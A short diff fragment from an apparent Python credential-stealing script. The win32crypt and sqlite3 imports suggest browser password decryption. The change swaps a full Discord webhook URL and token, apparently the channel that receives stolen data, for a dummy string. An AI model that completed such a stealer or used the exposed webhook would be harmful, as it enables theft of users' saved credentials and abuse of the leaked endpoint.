@@ -12,7 +12,7 @@ import win32crypt
 import sqlite3
 
 
-webhook_url = "https://discord.com/api/webhooks/1079350643413762062/PFhXhfER5tw1FvmEKmR2ns38a1g4ViXDQTCOCjTxS35gdFTWxcXG1rfQTj6RTsIBbVbf"
+webhook_url = "wdwdw"
 
 
 
